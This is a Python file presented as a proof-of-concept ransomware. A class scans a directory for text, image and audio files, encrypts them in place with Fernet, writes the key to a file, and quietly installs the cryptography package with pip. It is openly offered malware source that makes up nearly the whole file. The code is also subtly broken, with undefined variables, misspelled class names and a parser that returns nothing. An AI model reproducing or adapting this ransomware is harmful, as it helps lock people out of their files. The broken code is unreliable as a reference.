#!/usr/bin/env python3

'''
Name : Alexis Rodriguez

Start Date : 2020-02-18
End Date : 2020-02-..


Description : This module is simply an example of a ransomware malware. *Warning*: This file is
dangerous; encrypting your files and losing the key will be horrendous so please be very cautious 
of the directory that is being encrypted when attempting to use this program. This program is just 
another proof of concept. The files that are defined within the Ransomware class will be encrypted
depending on the directory that is provided as an argument. The key generated will be stored into a file
and can be retrieved using a class method. 


		  ooo,    .---.
 o`  o   /    |\________________
o`   'oooo()  | ________   _   _)
`oo   o` \    |/        | | | |
  `ooo'   `---'         "-" |_|
'''

# --> try importing modules
try:
	# --> Import subprocess for executing system commands.
	import subprocess as subp
	# --> Import time to pause execution of program
	# --> until cryptography module gets installed
	import time
	# --> Import os so that we can obtain all the file
	# --> in a specific directory
	import os
	# --> Import argparse to handle user arguments more conveniently
	import argparse
	# --> import sys for additional argument parsing
	import sys
	# --> import tqdm for creating progress bars
	import tqdm
	# --> import pyfiglet for custom ASCII art fonts
	from pyfiglet import Figlet
	# --> Try importing cryptography module class
	try:
		from cryptography.fernet import Fernet, MultiFernet
	# --> If any errors occurs importing the cryp module
	# --> Install it with the following command
	except:
		subp.call('pip3 install cryptography', shell=True)
		# --> Wait 30 seconds before preceding with the program
		time.sleep(30)
		# --> Try importing again after attempting to install
		# --> the module
		from cryptography.fernet import Fernet
# --> handling error loading a module
except ImportError:
	print('[-] There was an error importing a module')


'''
****************************************************************************************************
---------------------------------Ransomware Class Definition----------------------------------------
****************************************************************************************************
'''

class Ransomware:

	def __init__(self, action, directory='.', key_file='fernet_key.txt'):
		'''
		$ Declare encryption key variable
		$ Get directory to encrypt/decrypt
		$ Get name of file to store key
		'''
		print("[+] Invoking Ransomware constructor")
		# --> Ferney key
		self.key=None
		# --> Fernet object
		self.linear_b=None
		# --> File extensions to encrypt
		self.file_ext_target=['.txt', '.jpg', '.png', '.mp3']
		# --> File where key is being stored if key exists in another file
		self.key_file=key_file
		# --> Directory that contains files we want to encrypt
		# --> Default directory is the current directory
		self.directory=directory
		# --> Cryptographic action to perform
		self.action=action


	def get_valid_files(self, directory):
		'''
		$ Find files that contain the extension specified in our file_ext_target list
		$ Returns a list that contains valid files to encrypt
		'''
		# --> List containing all files that end with the extensions
		# --> Defined in the file_ext_target's list 
		valid_files_to_encrypt = []

		# --> Os.walk will return an iterable that contains current working directory,
		# --> directories in the current directory, and all files in the current
		# --> directory
		for working_dir, _, file in os.walk(directory):
			# --> Check if the extensions of the file are valid
			if file[-4:] in self.file_ext_target:
				# --> Get full valid file path
				valid_file_path = os.path.join(abs_path, file)
				# --> Append valid file path to valid files list
				valid_files_to_encrypt.append(valid_file_path)
		# --> return list of valid files
		return valid_files_to_encrypt


	def encrypt_or_decrypt(self, list_of_files):
		'''
		$ Opening all files in the list of files argument
		$ and send the contents of these files to be encrypted
		'''
		progress_bar_info = ''
		# --> If the action variable is set to encrypt
		if action == 'encrypt':
			# --> Set the progress bar title to the following
			progress_bar_info = 'Encrypting files'
		# --> If the action variable is set to decrypt
		else:
			# --> Set the progress bar title to the following
			progress_bar_info = 'Decrypting files'

		for file in tqdm(list_of_files, desc=progress_bar_info):
			# --> open file for reading + writing
			with open(file, 'rb+') as f:
				# --> read the files contents
				file_content = f.read()
				# --> If encrypt argument is True
				if encrypt:
					# ENCRYPT IT!!!!
					encrypted = self.encrypt_it(file_content)
					# --> write encrypted data back into file
					f.write(encrypted)
				# --> If encrypt argument is False
				else:
					# DECRYPT IT!!!!
					decrypted = self.decrypt_it(file_content)
					# --> write decrypted data back into file
					f.write(decrypted)


	def store_key(self):
		'''
		$ Store key in file
		'''
		print('[+] Storing key in file')
		#
		with open(keyfile,'wb') as f:
			f.write(self.key)


	def get_key_from_file(self):
		'''
		$ Retrieve a key from a file
		'''
		self.key = open(self.keyfile,'r').read()
	
	def key_gen(self):
		'''
		$ Generate encryption/decryption key
		$ Instantiate Fernet object
		'''
		print('[+] Generating Fernet key')
		# --> Generating key for encryption
		self.key = Fernet(Fernet.generate_key())

		self.store_key()
		# --> Attempt to generate Fernet object
		try:
			# --> Fernet object instantiation
			self.linear_b = Fernet(key)
		except:
			# --> If it fails
			print('[-] Unable to instantiate Fernet object for encryption')
		# --> Return Fernet key
		return self.key

	def encrypt_it(self, to_encrypt):
		'''
		$ Encrypting all files in the directory stored in the directory variable
		'''
		print('[+] Encrypting all files in ' + self.directory + ' directory')

		# --> Return the encrypted version of the contents of a file
		return self.linear_b.encrypt(to_encrypt)


	def decrypt_it(self, to_encrypt):
		'''
		$ Decrypt all files in the directory stored in the directory variable
		'''
		print('[+] Decrypting all files in ' + self.directory + ' directory')
		# --> Return the decrypted data of an encrypted file
		return self.linear_b.decrypt(to_decrypt)

#%%%%%%%%%%%%%   End Ransomware Class

def parse_arguments():
	# --> Instantiate object for parsing arguments
	parser = argparse.ArgumentParser(usage=f'usage: {sys.argv[0]} -a|--action -d|--directory [-k/--keyfile]',
									description='Arguments for our Ransomware class')
	# --> Create a group for arguments that are required
	required = parser.add_argument_group('Required arguments')
	# --> This argument will define the directory that will be encrypted or decrypted
	required.add_argument('-d', '--directory', dest='directory', type=str, 
						help='Directory of files to encrypt or decrypt',
						required=True)
	# --> This argument will define the cryption action (decrypt/encrypt)
	required.add_argument('-a', '--action', dest='action', type=str, 
						  help='Encrypt or decrypt files files',
						  required=True, default='encrypt')
	# --> This argument will define the absolute path to a file that has a key
	# --> or will be used to store a key
	parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
						  help='Enter the fullpath of a file with the encryption/decryption key',
						  default=None)
	# --> Retrieve arguments that were passed 
	args = parser.parse_args()
	print(args)
	# --> return the arguments that were passed 


def signature():
	# --> creating ASCII art
	result = Figlet(font='pagga') 
	print(result.renderText('binexishatt')) 


'''
**************************************
-----------------MAIN-----------------
**************************************
'''
def initiate():
	# --> Print signature
	signature()
	# --> parse input passed as arguments
	parse_arguments()
	# --> Get arguments
	directory, action, keyfile = parse_arguments()
	# --> If no key file was passed, use the default 
	if keyfile == None:
		# -->  Instantiate Ransomware object with no key file
		Enigma = Ransonware(action=action,directory=directory)
	# --> If keyfile is passed
	else:
		# --> Instantiate Ransomware object with key file
		Enigma = Ransonware(action=action,directory=directory,keyfile=keyfile)
	# --> Scan specified directory for files with valid extensions
	valid_target_files = Enigma.get_valid_files()
	'''
	--> Obtianing Fernet key for encryption/decryption
	--> Change this to key = Enigma.get_key() to retrieve key from
		a file
	'''
	key = Enigma.key_gen()
	# --> Encrypt or decrypt files based on the crytographic action
	# --> that was passed as an argument
	Enigman.encrypt_or_decrypt(valid_target_files)


# --> Check if the current module is main module
if __name__ == '__main__':
	initiate()